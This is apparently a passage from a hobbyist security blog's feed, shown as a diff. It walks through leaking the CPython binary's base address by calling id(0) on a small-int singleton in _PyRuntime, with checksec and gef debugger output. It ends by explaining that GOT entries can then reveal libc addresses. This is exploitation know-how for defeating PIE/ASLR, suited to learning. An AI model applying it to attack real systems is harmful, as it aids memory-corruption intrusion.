-<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="o">-</span><span class="p">(</span><span class="n">navi</span><span class="err">'</span><span class="n">s</span> <span class="n">curette</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~/</span><span class="n">blog</span><span class="o">-</span><span class="n">rawr</span><span class="o">/</span><span class="n">assets</span><span class="o">/</span><span class="n">code</span><span class="o">-</span><span class="n">src</span><span class="o">/</span><span class="n">python</span><span class="o">-</span><span class="n">pwn</span><span class="p">]</span>
-<span class="p">[</span><span class="o">-</span><span class="err">$</span> <span class="n">checksec</span> <span class="o">--</span><span class="n">file</span><span class="o">=</span><span class="n">python3</span><span class="p">.</span><span class="mi">11</span>
-<span class="n">RELRO</span>           <span class="n">STACK</span> <span class="n">CANARY</span>      <span class="n">NX</span>            <span class="n">PIE</span>             <span class="n">RPATH</span>      <span class="n">RUNPATH</span>	<span class="n">Symbols</span>		<span class="n">FORTIFY</span>	<span class="n">Fortified</span>	<span class="n">Fortifiable</span>	<span class="kt">FILE</span>
-<span class="n">Partial</span> <span class="n">RELRO</span>   <span class="n">No</span> <span class="n">canary</span> <span class="n">found</span>   <span class="n">NX</span> <span class="n">enabled</span>    <span class="n">PIE</span> <span class="n">enabled</span>     <span class="n">No</span> <span class="n">RPATH</span>   <span class="n">No</span> <span class="n">RUNPATH</span>   <span class="mi">14726</span> <span class="n">Symbols</span>	 <span class="n">No</span>	<span class="mi">0</span>		<span class="mi">26</span>		<span class="n">python3</span><span class="p">.</span><span class="mi">11</span>
-                                                                                                                                                                                             
-<span class="p">[</span><span class="o">-</span><span class="p">(</span><span class="n">navi</span><span class="err">'</span><span class="n">s</span> <span class="n">curette</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~/</span><span class="n">blog</span><span class="o">-</span><span class="n">rawr</span><span class="o">/</span><span class="n">assets</span><span class="o">/</span><span class="n">code</span><span class="o">-</span><span class="n">src</span><span class="o">/</span><span class="n">python</span><span class="o">-</span><span class="n">pwn</span><span class="p">]</span>
-<span class="p">[</span><span class="o">-</span><span class="err">$</span> <span class="n">checksec</span> <span class="o">--</span><span class="n">file</span><span class="o">=/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">python</span>
-<span class="n">RELRO</span>           <span class="n">STACK</span> <span class="n">CANARY</span>      <span class="n">NX</span>            <span class="n">PIE</span>             <span class="n">RPATH</span>      <span class="n">RUNPATH</span>	<span class="n">Symbols</span>		<span class="n">FORTIFY</span>	<span class="n">Fortified</span>	<span class="n">Fortifiable</span>	<span class="kt">FILE</span>
-<span class="n">Partial</span> <span class="n">RELRO</span>   <span class="n">Canary</span> <span class="n">found</span>      <span class="n">NX</span> <span class="n">enabled</span>    <span class="n">No</span> <span class="n">PIE</span>          <span class="n">No</span> <span class="n">RPATH</span>   <span class="n">No</span> <span class="n">RUNPATH</span>   <span class="n">No</span> <span class="n">Symbols</span>	 <span class="n">Yes</span>	<span class="mi">15</span>		<span class="mi">40</span>		<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">python</span>
-</code></pre></div></div>
-
-<p>i introduce the first function, <code class="language-plaintext highlighter-rouge">id()</code>, which gives us the <em>address</em> of any python object we pass in:</p>
-
-<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="nb">hex</span><span class="p">(</span><span class="nb">id</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
-<span class="s">'0xa41ab0'</span>
-<span class="o">&gt;&gt;&gt;</span> <span class="nb">hex</span><span class="p">(</span><span class="nb">id</span><span class="p">(</span><span class="s">'abcdefgh'</span><span class="p">))</span>
-<span class="s">'0x7f28953d67f0'</span>
-</code></pre></div></div>
-
-<p>it should be obvious why this is very useful, but keep in mind we would still need an object that lies within the python binary (and <em>not</em> in libc) that does not actually get allocated to the heap, <em>and</em> is a specific offset from the python binary base. AND we need to be able to access this from the python language itself!</p>
-
-<p>i actually didnt know where to look for this, until my good buddy fern just answered my prayers (inshallah)</p>
-
-<p><img src="/assets/images/342888.png" alt="alt text" /></p>
-
-<p>this is, as fern themselves would say, very ‘profound’ and ‘elegant’ and whatnot (at least i think it is ! it’s certainly leagues more elegant than what i was planning to do , as i detailed above there)</p>
-
-<p>ok yes. so <code class="language-plaintext highlighter-rouge">id(0)</code> does in fact give an address that is a <em>fixed</em> offset from our binary base, hence leaking PIE!</p>
-
-<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gef</span><span class="o">&gt;</span> <span class="n">run</span>
-<span class="n">Starting</span> <span class="n">program</span><span class="o">:</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">navi</span><span class="o">/</span><span class="n">blog</span><span class="o">-</span><span class="n">rawr</span><span class="o">/</span><span class="n">assets</span><span class="o">/</span><span class="n">code</span><span class="o">-</span><span class="n">src</span><span class="o">/</span><span class="n">python</span><span class="o">-</span><span class="n">pwn</span><span class="o">/</span><span class="n">python3</span><span class="p">.</span><span class="mi">11</span> 
-<span class="p">[</span><span class="n">Thread</span> <span class="n">debugging</span> <span class="n">using</span> <span class="n">libthread_db</span> <span class="n">enabled</span><span class="p">]</span>
-<span class="n">Using</span> <span class="n">host</span> <span class="n">libthread_db</span> <span class="n">library</span> <span class="s">"/lib/x86_64-linux-gnu/libthread_db.so.1"</span><span class="p">.</span>
-<span class="n">Python</span> <span class="mi">3</span><span class="p">.</span><span class="mi">11</span><span class="p">.</span><span class="mi">7</span> <span class="p">(</span><span class="n">main</span><span class="p">,</span> <span class="n">Oct</span> <span class="mi">19</span> <span class="mi">2025</span><span class="p">,</span> <span class="mi">15</span><span class="o">:</span><span class="mi">15</span><span class="o">:</span><span class="mi">58</span><span class="p">)</span> <span class="p">[</span><span class="n">GCC</span> <span class="mi">14</span><span class="p">.</span><span class="mi">2</span><span class="p">.</span><span class="mi">0</span><span class="p">]</span> <span class="n">on</span> <span class="n">linux</span>
-<span class="n">Type</span> <span class="s">"help"</span><span class="p">,</span> <span class="s">"copyright"</span><span class="p">,</span> <span class="s">"credits"</span> <span class="n">or</span> <span class="s">"license"</span> <span class="k">for</span> <span class="n">more</span> <span class="n">information</span><span class="p">.</span>
-<span class="o">&gt;&gt;&gt;</span> <span class="n">hex</span><span class="p">(</span><span class="n">id</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
-<span class="err">'</span><span class="mh">0x555555ac2828</span><span class="err">'</span>
-</code></pre></div></div>
-
-<p>just for our own edification let’s check what’s actually <em>at</em> this address</p>
-
-<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gef</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="n">x</span> <span class="mh">0x555555ac2828</span>
-<span class="mh">0x555555ac2828</span> <span class="o">&lt;</span><span class="n">_PyRuntime</span><span class="o">+</span><span class="mi">840</span><span class="o">&gt;:</span>	<span class="mh">0x3b9acc53</span>
-</code></pre></div></div>
-
-<p>eh.. what? this is a pointer to some field in <code class="language-plaintext highlighter-rouge">_PyRuntime</code>? let’s actually take a quick diversion and inspect the</p>
-
-<h3 id="format-of-_pyruntime">format of _PyRuntime</h3>
-
-<p>this is not relevant to pwning python at all btw skip if you want</p>
-
-<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">type</span> <span class="o">=</span> <span class="k">struct</span> <span class="n">pyruntimestate</span> <span class="p">{</span>
-    <span class="kt">int</span> <span class="n">_initialized</span><span class="p">;</span>
-    <span class="kt">int</span> <span class="n">preinitializing</span><span class="p">;</span>
-    <span class="kt">int</span> <span class="n">preinitialized</span><span class="p">;</span>
-    <span class="kt">int</span> <span class="n">core_initialized</span><span class="p">;</span>
-    <span class="kt">int</span> <span class="n">initialized</span><span class="p">;</span>
-    <span class="n">_Py_atomic_address</span> <span class="n">_finalizing</span><span class="p">;</span>
-    <span class="k">struct</span> <span class="n">pyinterpreters</span> <span class="n">interpreters</span><span class="p">;</span>
-    <span class="k">struct</span> <span class="n">_xidregistry</span> <span class="n">xidregistry</span><span class="p">;</span>
-    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">main_thread</span><span class="p">;</span>
-    <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">exitfuncs</span><span class="p">[</span><span class="mi">32</span><span class="p">])(</span><span class="kt">void</span><span class="p">);</span>
-    <span class="kt">int</span> <span class="n">nexitfuncs</span><span class="p">;</span>
-    <span class="k">struct</span> <span class="n">_ceval_runtime_state</span> <span class="n">ceval</span><span class="p">;</span>
-    <span class="k">struct</span> <span class="n">_gilstate_runtime_state</span> <span class="n">gilstate</span><span class="p">;</span>
-    <span class="n">PyPreConfig</span> <span class="n">preconfig</span><span class="p">;</span>
-    <span class="n">Py_OpenCodeHookFunction</span> <span class="n">open_code_hook</span><span class="p">;</span>
-    <span class="kt">void</span> <span class="o">*</span><span class="n">open_code_userdata</span><span class="p">;</span>
-    <span class="n">_Py_AuditHookEntry</span> <span class="o">*</span><span class="n">audit_hook_head</span><span class="p">;</span>
-    <span class="k">struct</span> <span class="n">_Py_unicode_runtime_ids</span> <span class="n">unicode_ids</span><span class="p">;</span>
-    <span class="k">struct</span> <span class="n">_Py_global_objects</span> <span class="n">global_objects</span><span class="p">;</span>
-    <span class="n">PyInterpreterState</span> <span class="n">_main_interpreter</span><span class="p">;</span>
-<span class="p">}</span>
-</code></pre></div></div>
-
-<p>theres q a lot of fields in this struct but just by eyepower we probably want <code class="language-plaintext highlighter-rouge">global_objects</code>, and indeed, we do:</p>
-
-<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gef</span><span class="o">&gt;</span> <span class="n">p</span> <span class="o">&amp;</span><span class="n">_PyRuntime</span><span class="o">-&gt;</span><span class="n">global_objects</span>
-<span class="err">$</span><span class="mi">15</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">_Py_global_objects</span> <span class="o">*</span><span class="p">)</span> <span class="mh">0x555555ac2788</span> <span class="o">&lt;</span><span class="n">_PyRuntime</span><span class="o">+</span><span class="mi">680</span><span class="o">&gt;</span>
-</code></pre></div></div>
-
-<p>the offset is about right yeah</p>
-
-<p>let’s actually print what’s in this global_objects struct:</p>
-<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
-
-<span class="n">gef</span><span class="o">&gt;</span> <span class="n">ptype</span> <span class="o">&amp;</span><span class="n">_PyRuntime</span><span class="o">-&gt;</span><span class="n">global_objects</span>
-<span class="n">type</span> <span class="o">=</span> <span class="k">struct</span> <span class="n">_Py_global_objects</span> <span class="p">{</span>
-    <span class="k">struct</span> <span class="p">{</span>
-        <span class="n">PyLongObject</span> <span class="n">small_ints</span><span class="p">[</span><span class="mi">262</span><span class="p">];</span>
-        <span class="n">PyBytesObject</span> <span class="n">bytes_empty</span><span class="p">;</span>
-        <span class="k">struct</span> <span class="p">{...}</span> <span class="n">bytes_characters</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
-        <span class="k">struct</span> <span class="n">_Py_global_strings</span> <span class="n">strings</span><span class="p">;</span>
-        <span class="n">PyGC_Head</span> <span class="n">_tuple_empty_gc_not_used</span><span class="p">;</span>
-        <span class="n">PyTupleObject</span> <span class="n">tuple_empty</span><span class="p">;</span>
-    <span class="p">}</span> <span class="n">singletons</span><span class="p">;</span>
-<span class="p">}</span> <span class="o">*</span>
-</code></pre></div></div>
-
-<p>given we got the id of <code class="language-plaintext highlighter-rouge">0</code>, our ptr is probably just an address to a <code class="language-plaintext highlighter-rouge">PyLongObject</code> and ofc we can dereference it as such</p>
-
-<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gef</span><span class="o">&gt;</span> <span class="n">p</span> <span class="o">*</span><span class="p">(</span><span class="n">PyLongObject</span><span class="o">*</span><span class="p">)</span> <span class="mh">0x555555ac2828</span>
-<span class="err">$</span><span class="mi">16</span> <span class="o">=</span> <span class="p">{</span>
-  <span class="n">ob_base</span> <span class="o">=</span> <span class="p">{</span>
-    <span class="n">ob_base</span> <span class="o">=</span> <span class="p">{</span>
-      <span class="n">ob_refcnt</span> <span class="o">=</span> <span class="mh">0x3b9acc53</span><span class="p">,</span>
-      <span class="n">ob_type</span> <span class="o">=</span> <span class="mh">0x5555559cbc60</span> <span class="o">&lt;</span><span class="n">PyLong_Type</span><span class="o">&gt;</span>
-    <span class="p">},</span>
-    <span class="n">ob_size</span> <span class="o">=</span> <span class="mh">0x0</span>
-  <span class="p">},</span>
-  <span class="n">ob_digit</span> <span class="o">=</span> <span class="p">{</span>
-    <span class="p">[</span><span class="mh">0x0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span>
-  <span class="p">}</span>
-<span class="p">}</span>
-</code></pre></div></div>
-
-<p>woohoo yup</p>
-
-<p>anyways the reason this works is because our <code class="language-plaintext highlighter-rouge">_PyRuntime</code> var is defined in our python binary itself. it’s not in the heap, it’s not in libc, it’s not wherever else. so the offsets will always be constant.</p>
-
-<h3 id="back-to-pwning">back to pwning</h3>
-
-<p>now that we are able to leak the address of this object, we can just subtract the offsets as per normal to get our PIE leak. the goal now is to then find addresses to libc after getting our PIE leak, and we can do so by finding entries in the Global Offset Table (GOT). just as a quick refresher: the GOT is where addresses to functions in libc are stored, such as <code class="language-plaintext highlighter-rouge">fgets()</code>, <code class="language-plaintext highlighter-rouge">printf()</code>, and etcetera. in a dynamically linked binary, these libc functions are defined in a separate address space, and the binary does not know where those functions actually are. the addresses get resolved when the binary needs to execute them, after which they are stored in the GOT. <em>meaning</em>, the GOT will have addresses to functions in libc!</p>]]></content><author><name></name></author><summary type="html"><![CDATA[recommended listening for this post is yeule’s eko]]></summary></entry></feed>
+</code></pre></div></div>]]></content><author><name></name></author><summary type="html"><![CDATA[recommended listening for this post is aoi koi no daidaiiro no hi by masudore]]></summary></entry></feed>
